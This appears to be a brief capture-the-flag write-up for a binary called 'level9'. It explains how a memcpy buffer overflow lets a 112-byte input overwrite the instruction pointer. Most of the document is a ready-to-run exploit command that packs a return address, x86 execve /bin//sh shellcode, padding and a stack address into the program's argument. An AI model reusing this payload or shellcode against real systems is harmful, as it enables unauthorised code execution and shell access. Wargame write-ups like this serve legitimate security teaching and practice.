```

we will have to exploit a buffer overflow using the function memcpy that will copy the length of our input into the annotation array 

we can see that the program segfault at 109 byte when feeding an input of 112 byte we can see that the last 4 bytes overrides the instruction pointer so our payload will be :

4 byte for the address of the shell code + 25 byte for the actual shellcode + padding(108 - 4 -25) + address of stack + 4

./level9 $(python -c "print('\x10\xa0\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'+ 'A' *79 + '\x0c\xa0\x04\x08')") 
```